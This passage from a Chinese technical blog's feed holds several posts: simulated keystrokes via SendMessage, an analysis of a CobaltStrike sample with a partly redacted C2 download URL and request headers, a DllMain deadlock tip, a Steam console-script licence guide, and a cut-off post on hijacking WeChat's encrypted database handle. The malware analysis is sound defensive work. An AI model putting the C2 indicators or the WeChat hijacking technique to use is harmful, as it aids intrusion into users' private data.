class="line">keyboard_lparam.m_lparam.m_dwLastKeyStatus = dwLastKeyStatus;</span><br><span class="line">keyboard_lparam.m_lparam.m_dwTransitionState = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 按下该键</span></span><br><span class="line">::<span class="built_in">SendMessage</span>(hWnd, WM_KEYDOWN, <span class="string">&#x27;A&#x27;</span>, keyboard_lparam.m_dwParam);</span><br><span class="line">::<span class="built_in">SendMessage</span>(hWnd, WM_CHAR, <span class="string">&#x27;A&#x27;</span>, keyboard_lparam.m_dwParam);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 松开该键</span></span><br><span class="line">keyboard_lparam.m_lparam.m_dwLastKeyStatus = <span class="number">1</span>;</span><br><span class="line">keyboard_lparam.m_lparam.m_dwTransitionState = <span class="number">1</span>;</span><br><span class="line">::<span class="built_in">SendMessage</span>(hWnd, WM_KEYUP, <span class="string">&#x27;A&#x27;</span>, keyboard_lparam.m_dwParam);</span><br></pre></td></tr></table></figure><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>如果本文对你有所帮助，那么请你点赞留言哦~</p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike样本分析</title>
      <link href="/c1b89df089b7/"/>
      <url>/c1b89df089b7/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike样本分析"><a href="#CobaltStrike样本分析" class="headerlink" title="CobaltStrike样本分析"></a>CobaltStrike样本分析</h1><h2 id="样本基础信息"><a href="#样本基础信息" class="headerlink" title="样本基础信息"></a>样本基础信息</h2><p>样本名称：s_*<em>.sample.exe<br>样本类型：CobaltStrike<br>样本大小：</em>.<em>* MB<br>样本哈希: 0BB**_<strong>4B</strong></em><strong>405BA10D</strong>***FD13<br>编写语言：delphi</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>样本通过sub_50369C函数在内存中解压出一个PE结构<br><img src="/../uploads/2022/10/2026178589.png" alt="2022-10-19T08:50:22.png" title="2022-10-19T08:50:22.png"><br><img src="/../uploads/2022/10/2730281523.png" alt="2022-10-19T08:50:44.png" title="2022-10-19T08:50:44.png"><br>该段PE结构主要负责在样本自身中进一步解压执行CobaltStrike Shellcode。<br>在NVISO Labs中的一篇文章标注出了CobaltStrike样本的特征。<br><img src="/../uploads/2022/10/3302488199.png" alt="2022-10-19T08:51:05.png" title="2022-10-19T08:51:05.png"><br><img src="/../uploads/2022/10/1200344660.png" alt="2022-10-19T08:51:22.png" title="2022-10-19T08:51:22.png"><br>并且从该样本中也可以找出相同的特征位置，从此可以确定该样本为CobaltStrike样本。<br><img src="/../uploads/2022/10/660043598.png" alt="2022-10-19T08:51:32.png" title="2022-10-19T08:51:32.png"><br>PE解压出的Shellcode主要负责动态获取函数地址和下载远程服务器中的恶意文件。<br>从下图中函数为样本解压完CobaltStrike Shellcode后通过线程方式执行CobaltStrike Shellcode。<br><img src="/../uploads/2022/10/616843023.png" alt="2022-10-19T08:51:44.png" title="2022-10-19T08:51:44.png"><br>载入通讯动态链接库<br><img src="/../uploads/2022/10/4198030445.png" alt="2022-10-19T08:51:55.png" title="2022-10-19T08:51:55.png"><br>与CS服务器建立连接<br><img src="/../uploads/2022/10/2969404977.png" alt="2022-10-19T09:04:08.png" title="2022-10-19T09:04:08.png"><br>下载文件ms.mp3<br>文件地址：http:&#x2F;&#x2F;<strong>.</strong>*.169[.]34&#x2F;files&#x2F;ms.mp3<br>请求头：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host: pr_\*_\*sco.com  </span><br><span class="line">Connection: close  </span><br><span class="line">Accept-Encoding: br  </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246  </span><br></pre></td></tr></table></figure><p><img src="/../uploads/2022/10/3712839616.png" alt="2022-10-19T08:52:25.png" title="2022-10-19T08:52:25.png"><br><img src="/../uploads/2022/10/447480032.png" alt="2022-10-19T09:05:44.png" title="2022-10-19T09:05:44.png"><br>由于当前CS服务器已经关闭，所以HttpSendRequestA无法完成请求，返回请求失败错误码，致使无法完成进一步分析。<br><img src="/../uploads/2022/10/3595927633.png" alt="2022-10-19T09:08:24.png" title="2022-10-19T09:08:24.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
            <tag> 样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dllmain中的注意事项</title>
      <link href="/3dcd3d6f6441/"/>
      <url>/3dcd3d6f6441/</url>
      
        <content type="html"><![CDATA[<h1 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h1><p>dllmain微软文档：<a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain">https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain</a></p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>在微软文档中我们看到一段话，如下图所示：</p><p><img src="/../uploads/2022/02/3616635793.png" alt="l00c1n9g.png" title="l00c1n9g.png"></p><p>这段文字的意思主要为，请不要在dllmain中调用会调用<code>LoadLibrary</code>的函数，如果你调用的函数会调用<code>LoadLibrary</code>函数的话，会导致线程死锁。</p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>那么我们如何解决呢，比方说我们劫持了一个dll。需要做一些初始化操作我们应该怎么办。这时候我们就需要启动一个线程，在这个线程去调用我们的初始化函数，而不再<code>dllmain</code>中做任何初始化操作。</p><p><img src="/../uploads/2022/02/3159327673.png" alt="l00c8rlu.png" title="l00c8rlu.png"></p><p><img src="/../uploads/2022/02/829501548.png" alt="l00c9fua.png" title="l00c9fua.png"></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dllmain </tag>
            
            <tag> LoadLibrary </tag>
            
            <tag> 线程死锁 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PC端外区Steam添加游戏教程</title>
      <link href="/c057e1ffba87/"/>
      <url>/c057e1ffba87/</url>
      
        <content type="html"><![CDATA[<h1 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h1><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=724138105&bvid=BV1vS4y1r7rC&cid=513042502&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;"> </iframe></div><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>以下操作均为在网页浏览器中进行，非Steam客户端<br>如果你懂开发者工具是什么可以跳过前言，直接看第一步。<br>Steam一定要是外区的！！！添加不能直接入库的游戏！！！！！<br>Steam一定要是外区的！！！添加不能直接入库的游戏！！！！！<br>Steam一定要是外区的！！！添加不能直接入库的游戏！！！！！<br>Steam一定要是外区的！！！添加不能直接入库的游戏！！！！！</p></blockquote><h2 id="下载Google-Chrome浏览器"><a href="#下载Google-Chrome浏览器" class="headerlink" title="下载Google Chrome浏览器"></a>下载Google Chrome浏览器</h2><p>如下载地址：<a href="https://www.google.cn/chrome/">https://www.google.cn/chrome/</a></p><p><img src="/../uploads/2022/02/103186565.png" alt="kzjcb4h4.png" title="kzjcb4h4.png"></p><h2 id="如何查看自己的Steam所属地区"><a href="#如何查看自己的Steam所属地区" class="headerlink" title="如何查看自己的Steam所属地区"></a>如何查看自己的Steam所属地区</h2><p>1、登录网页版Steam，链接地址：<a href="https://store.steampowered.com/login">https://store.steampowered.com/login</a>。输入您的账号密码点击登录</p><p><img src="/../uploads/2022/02/2540909762.png" alt="kzox5qft.png" title="kzox5qft.png"></p><p>2、进入账户明细，如下图所示</p><p><img src="/../uploads/2022/02/3989751779.png" alt="kzox7ukj.png" title="kzox7ukj.png"></p><p>3、进入后，下图所示位置即为你的Steam所属地区</p><p><img src="/../uploads/2022/02/1487601607.png" alt="kzox9alx.png" title="kzox9alx.png"></p><h2 id="开发者工具如何打开"><a href="#开发者工具如何打开" class="headerlink" title="开发者工具如何打开"></a>开发者工具如何打开</h2><p>2、 进入谷歌浏览器，在<strong>需要打开开发者工具的页面中</strong>点击右上角下图所示位置</p><p><img src="/../uploads/2022/02/4126545002.png" alt="kzjcdr92.png" title="kzjcdr92.png"></p><p>3、点击弹出菜单的更多工具</p><p><img src="/../uploads/2022/02/2248912925.png" alt="kzjcet1d.png" title="kzjcet1d.png"></p><p>4、点击开发者工具，即可打开开发者工具。也可以使用快捷键F12打开开发者工具</p><p><img src="/../uploads/2022/02/2685232703.png" alt="kzjcfw94.png" title="kzjcfw94.png"></p><h1 id="第一步：获取游戏subid"><a href="#第一步：获取游戏subid" class="headerlink" title="第一步：获取游戏subid"></a>第一步：获取游戏subid</h1><p>打开网址：<a href="https://steamdb.info/">https://steamdb.info/</a>，搜索你的游戏。这里用CSNZ举例<br>1、先搜索csnz</p><p><img src="/../uploads/2022/02/1513303051.png" alt="kzdz7xas.png" title="kzdz7xas.png"></p><p>2、点击进入游戏本体详情页面</p><p><img src="/../uploads/2022/02/2870570911.png" alt="kzdz94i9.png" title="kzdz94i9.png"></p><p>3、点击游戏的Packages</p><p><img src="/../uploads/2022/02/1484084911.png" alt="kzdz9l54.png" title="kzdz9l54.png"></p><p>4、复制游戏的subid</p><p><img src="/../uploads/2022/02/1691670572.png" alt="kzdza6am.png" title="kzdza6am.png"></p><h1 id="第二步：修改入库代码"><a href="#第二步：修改入库代码" class="headerlink" title="第二步：修改入库代码"></a>第二步：修改入库代码</h1><blockquote><p>注：第二步与第一步页面没有关系，仅仅需要第一步获得到的subid，下面代码为单独存在的入库代码。</p></blockquote><p>第一步完成后，我们得到了游戏的subid，将下面代码freePackages中的数字改为游戏的subid代码<br>例如：var freePackages &#x3D; [36804];</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (location.<span class="property">hostname</span> !== <span class="string">&#x27;store.steampowered.com&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;在 Steam 商店运行此代码!&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> jQuery !== <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">        <span class="title class_">ShowAlertDialog</span>(<span class="string">&#x27;Fail&#x27;</span>, <span class="string">&#x27;这个页面没有jQuery，试试主页.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;header_notification_area&#x27;</span>) === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title class_">ShowAlertDialog</span>(<span class="string">&#x27;Fail&#x27;</span>, <span class="string">&#x27;你必须先登录.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 游戏的subid，注意这个数字并不是steam游戏详情页的后缀，这个数字查找方法，详情看上方。注意下文中的中括号不要删除，[]</span></span><br><span class="line">    <span class="keyword">var</span> freePackages = [需要更改的<span class="variable constant_">ID</span>（此<span class="variable constant_">ID</span>为第一步找到的subid）];</span><br><span class="line">    <span class="keyword">var</span> loaded = <span class="number">0</span>,</span><br><span class="line">        total = freePackages.<span class="property">length</span>,</span><br><span class="line">        modal = <span class="title class_">ShowBlockingWaitDialog</span>(<span class="string">&#x27;Executing...&#x27;</span>, <span class="string">&#x27;Please wait until all requests finish.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; total; i++) &#123;</span><br><span class="line">        jQuery.<span class="title function_">post</span>(</span><br><span class="line">            <span class="string">&#x27;//store.steampowered.com/checkout/addfreelicense&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">action</span>: <span class="string">&#x27;add_to_cart&#x27;</span>,</span><br><span class="line">            <span class="attr">sessionid</span>: g_sessionID,</span><br><span class="line">            <span class="attr">subid</span>: freePackages[i]</span><br><span class="line">        &#125;, <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">            loaded++;</span><br><span class="line">            modal.<span class="title class_">Dismiss</span>();</span><br><span class="line">            <span class="keyword">if</span> (loaded === total) &#123;</span><br><span class="line">                <span class="title class_">ShowAlertDialog</span>(<span class="string">&#x27;所有游戏已加入成功!&#x27;</span>, <span class="string">&#x27;开始享受吧.&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                modal = <span class="title class_">ShowBlockingWaitDialog</span>(<span class="string">&#x27;执行中...&#x27;</span>, <span class="string">&#x27;Loaded &#x27;</span> + loaded + <span class="string">&#x27;/&#x27;</span> + total);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).<span class="title function_">fail</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        loaded++;</span><br><span class="line">            modal.<span class="title class_">Dismiss</span>();</span><br><span class="line">            <span class="keyword">if</span> (loaded === total) &#123;</span><br><span class="line">                <span class="title class_">ShowAlertDialog</span>(<span class="string">&#x27;所有游戏已加入成功!&#x27;</span>, <span class="string">&#x27;开始享受吧.&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                modal = <span class="title class_">ShowBlockingWaitDialog</span>(<span class="string">&#x27;执行中...&#x27;</span>, <span class="string">&#x27;Loaded &#x27;</span> + loaded + <span class="string">&#x27;/&#x27;</span> + total);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;()); </span><br></pre></td></tr></table></figure><h1 id="第三步：登录steam进入特定页面"><a href="#第三步：登录steam进入特定页面" class="headerlink" title="第三步：登录steam进入特定页面"></a>第三步：登录steam进入特定页面</h1><p>登录网页Steam，然后在浏览器地址框输入 <code>https://store.steampowered.com/account/licenses/</code> 链接，按下回车键跳转至下图页面。</p><p><img src="/../uploads/2022/02/3782125989.png" alt="kzhsy0s2.png" title="kzhsy0s2.png"></p><h1 id="第四步：填写入库代码并执行入库操作"><a href="#第四步：填写入库代码并执行入库操作" class="headerlink" title="第四步：填写入库代码并执行入库操作"></a>第四步：填写入库代码并执行入库操作</h1><p>在上图页面中按F12进入开发者工具，若不懂开发者工具是什么请看前言介绍</p><blockquote><p>注：有的浏览器是英文，英文为Console。也就是控制台的意思</p></blockquote><p><img src="/../uploads/2022/02/2329760256.png" alt="kzhszr98.png" title="kzhszr98.png"></p><p>复制第二步入库代码粘贴到红框位置</p><p><img src="/../uploads/2022/02/1531939376.png" alt="kzht1awa.png" title="kzht1awa.png"></p><p>粘贴完成后，点击回车键。看到如下页面代表游戏添加成功。</p><p><img src="/../uploads/2022/02/2369172128.png" alt="kzdzddh2.png" title="kzdzddh2.png"></p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>CSNZ交流群欢迎加入：198626114</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>微信数据库句柄劫持与sqlite3_exec非法调用</title>
      <link href="/d6d7b930215b/"/>
      <url>/d6d7b930215b/</url>
      
        <content type="html"><![CDATA[<h1 id="微信数据库句柄劫持与sqlite3-exec非法调用"><a href="#微信数据库句柄劫持与sqlite3-exec非法调用" class="headerlink" title="微信数据库句柄劫持与sqlite3_exec非法调用"></a>微信数据库句柄劫持与sqlite3_exec非法调用</h1><hr><blockquote><p>版本号：3.4.5</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于最近编写微信机器人，需要用到读取群员列表功能，所以将目标锁向了微信数据库。</p><h2 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h2><p>通过网络资料，我们可以清晰的查询到微信使用的是sqlite3数据库，只不过对其进行了加密处理。微信官方也是为了方式用户信息被窃取，所以对数据库密钥出现的地方做了保护，貌似使用了vm虚拟化代码。由于技术不到家所以决定用另类办法。这里笔者决定劫持微信的数据库句柄，非法调用微信的数据库执行函数。</p><h2 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h2><p>1、下载sqlite3源码，下载方式：使用vcpkg进行下载安装。使用指令<code>vcpkg install sqlite3:x86-windows-static</code></p><p><img src="/../uploads/2022/01/3761075787.png" alt="kywoqey3.png" title="kywoqey3.png"></p><p>2、从网上CV一个示例代码，让我们先熟悉这个库的二进制代码，寻找函数特征</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sqlcipher/sqlite3.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">sqlite3* pDB; <span class="comment">// sqlite3为一个结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagMSG_ITEM</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">tagMSG_ITEM</span>() &#123;</span><br><span class="line">        ulUID = <span class="number">0</span>;</span><br><span class="line">        szFromUser = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        szToUser = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strDateTime = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strMsg = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tagMSG_ITEM&amp; <span class="keyword">operator</span>=(<span class="type">const</span> tagMSG_ITEM&amp; rMsgItem) &#123;</span><br><span class="line">        ulUID = rMsgItem.ulUID;</span><br><span class="line">        szFromUser = rMsgItem.szFromUser;</span><br><span class="line">        szToUser = rMsgItem.szToUser;</span><br><span class="line">        strDateTime = rMsgItem.strDateTime;</span><br><span class="line">        strMsg = rMsgItem.strMsg;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ulUID;</span><br><span class="line">    std::string    szFromUser;</span><br><span class="line">    std::string   szToUser;</span><br><span class="line">    std::string    strDateTime;</span><br><span class="line">    std::string    strMsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;MSG_ITEM, * PMSG_ITEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> std::list&lt;MSG_ITEM&gt;  ListMsgItem;</span><br><span class="line">ListMsgItem m_listMsg;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    函数名：createTable(sqlite3 *db)</span></span><br><span class="line"><span class="comment">    功能：创建一张数据表Table</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">createTable</span><span class="params">(sqlite3* db)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span>* zErrorMsg = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> rc = <span class="built_in">sqlite3_exec</span>(db, <span class="string">&quot;create table msg_xuxin_table (datetime TEXT, fromid NUMERIC, message TEXT, toid NUMERIC, uid INTEGER)&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;zErrorMsg);</span><br><span class="line">    <span class="keyword">if</span> (SQLITE_OK != rc) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;SQL error:%s\n&quot;</span>, zErrorMsg);</span><br><span class="line">        <span class="built_in">sqlite3_free</span>(zErrorMsg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    函数名：insertDB()</span></span><br><span class="line"><span class="comment">    功能：创建一张数据表Table</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">insertDB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span>* zErrorMsg = <span class="literal">NULL</span>;</span><br><span class="line">    std::string str1 = <span class="string">&quot;2016&quot;</span>;</span><br><span class="line">    std::string str2 = <span class="string">&quot;insert into msg_xuxin_table values(&#x27;2017-1-2 10:33:14&#x27;, 100, &#x27;2017-1-2&#x27;, 2000, 200);&quot;</span>;</span><br><span class="line">    <span class="type">int</span> rc = <span class="built_in">sqlite3_exec</span>(pDB, str2.<span class="built_in">c_str</span>(), <span class="number">0</span>, <span class="number">0</span>, &amp;zErrorMsg);</span><br><span class="line">    <span class="keyword">if</span> (SQLITE_OK != rc) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;SQL error:%s\n&quot;</span>, zErrorMsg);</span><br><span class="line">        <span class="built_in">sqlite3_free</span>(zErrorMsg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">callback</span><span class="params">(<span class="type">void</span>* NotUsed, <span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** azColName)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s = %s\n&quot;</span>, azColName[i], argv[i] ? argv[i] : <span class="string">&quot;NULL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> argc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">selectDB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span>* errMsg;</span><br><span class="line">    string strSQL = <span class="string">&quot;select * FROM Sqlite_master;&quot;</span>;</span><br><span class="line">    <span class="comment">// 第三个参数是一个回调函数，你可以通过这个函数得到执行的一些信息</span></span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">sqlite3_exec</span>(pDB, strSQL.<span class="built_in">c_str</span>(), callback, <span class="number">0</span>, &amp;errMsg);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (res != SQLITE_OK) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;执行SQL 出错.&quot;</span> &lt;&lt; errMsg &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;SQL成功执行.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 第二步：打开数据库.1、打开失败，关闭数据库并返回；2、打开成功就继续建立表</span></span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">sqlite3_open</span>(<span class="string">&quot;im_msg.db&quot;</span>, &amp;pDB);</span><br><span class="line">    <span class="keyword">if</span> (res) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Cannot open database:&quot;</span> &lt;&lt; <span class="built_in">sqlite3_errmsg</span>(pDB);</span><br><span class="line">        <span class="built_in">sqlite3_close</span>(pDB);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//  第三步：创建一个数据表</span></span><br><span class="line">    res = <span class="built_in">createTable</span>(pDB);</span><br><span class="line">    <span class="keyword">if</span> (res) &#123;</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 如果创建表失败</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//  第四步：实现基本的“增、删、改、查”的功能</span></span><br><span class="line">    res = <span class="built_in">insertDB</span>();<span class="comment">//增</span></span><br><span class="line">    res = <span class="built_in">selectDB</span>();<span class="comment">//查</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sqlite3_close</span>(pDB);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、将编译好的代码使用x32dbg进行调试【注意：一定要release版本，debug版本编译器会对你的代码添油加醋】</p><h2 id="分析sqlite3-open函数"><a href="#分析sqlite3-open函数" class="headerlink" title="分析sqlite3_open函数"></a>分析sqlite3_open函数</h2><p>1、首先定位到demo中函数<code>sqlite3_open</code>的执行位置</p><p><img src="/../uploads/2022/01/2892793962.png" alt="kywqlfhp.png" title="kywqlfhp.png"></p><p>2、在微信对其进行虚拟化之前此处特征码可以直接定位到我们需要的函数，但是最新版的微信已经使用虚拟化对其进行了代码保护，但是出于效率考量，微信肯定不能将整个库全部虚拟化，所以笔者准备寻找更里层的函数特征。我们将目标锁定到<code>openDatabase</code>函数。这里笔者采用动静结合方式去调试微信。</p><p><img src="/../uploads/2022/01/679223680.png" alt="kywqp2ab.png" title="kywqp2ab.png"></p><p>3、阅读代码后，我们发现该函数有几处明文，众所周知，我们代码尽可能的少暴漏明文，这样不好。所以我们将如下明文作为特征去微信中搜索看是否有所结果。</p><p><img src="/../uploads/2022/01/396268404.png" alt="kywqr2xq.png" 